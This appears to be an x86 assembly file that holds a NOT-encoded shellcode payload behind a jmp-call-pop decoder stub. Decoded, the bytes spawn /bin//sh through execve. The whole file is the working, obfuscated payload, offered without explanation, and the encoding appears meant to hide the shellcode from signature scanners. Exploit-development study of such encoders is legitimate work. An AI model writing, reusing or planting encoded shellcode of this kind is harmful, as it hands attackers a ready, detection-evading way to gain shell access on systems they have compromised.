section .text 

global main

main:
    jmp short decoder


decode:
    pop edi
    xor ecx,ecx
    mov cl,23

temp:   
    not byte [edi]
    inc edi 
    loop temp
    jmp short shellcode 


decoder:
    call decode
    shellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f


